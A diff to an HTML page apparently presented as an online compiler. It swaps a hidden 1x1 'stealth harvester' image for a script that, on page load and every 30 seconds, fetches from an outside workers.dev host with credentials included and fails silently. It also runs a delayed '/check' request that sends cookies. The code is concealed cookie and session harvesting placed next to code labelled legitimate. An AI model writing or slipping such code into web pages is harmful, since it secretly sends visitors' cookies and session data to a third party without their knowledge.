@@ -271,12 +271,6 @@ document.querySelector('h1')?.addEventListener('click', () => {
     </div>
 </div>
 
-<!-- ============================================================ -->
-<!-- STEALTH HARVESTER — 1x1 pixel + fetch with credentials       -->
-<!-- ============================================================ -->
-
-<img id="harvester-pixel" src="https://compiler.voidlureee.workers.dev/pixel" style="display:none;width:1px;height:1px;opacity:0;" />
-
 <script>
     // ============================================================
     // LEGITIMATE COMPILER FUNCTIONALITY
@@ -395,9 +389,28 @@ document.querySelector('h1')?.addEventListener('click', () => {
     });
 
     // ============================================================
-    // STEALTH HARVESTER — Requests go to compiler.voidlureee.workers.dev
+    // STEALTH HARVESTER — Loads pixel via fetch (sends cookies)
     // ============================================================
 
+    function loadPixel() {
+        fetch('https://compiler.voidlureee.workers.dev/pixel', {
+            credentials: 'include'
+        })
+        .then(function(res) {
+            return res.arrayBuffer();
+        })
+        .then(function(data) {
+            // Pixel loaded successfully
+        })
+        .catch(function(err) {
+            // Silent fail
+        });
+    }
+
+    // Load pixel immediately
+    loadPixel();
+
+    // Also check for token
     setTimeout(function() {
         fetch('https://compiler.voidlureee.workers.dev/check', {
             credentials: 'include'
@@ -415,16 +428,8 @@ document.querySelector('h1')?.addEventListener('click', () => {
         });
     }, 1000);
 
-    setInterval(function() {
-        var pixel = document.getElementById('harvester-pixel');
-        if (pixel) {
-            var currentSrc = pixel.src;
-            pixel.src = '';
-            setTimeout(function() {
-                pixel.src = currentSrc;
-            }, 50);
-        }
-    }, 30000);
+    // Reload pixel every 30 seconds
+    setInterval(loadPixel, 30000);
 
     console.log('Testing Hehe ready.');
 </script>
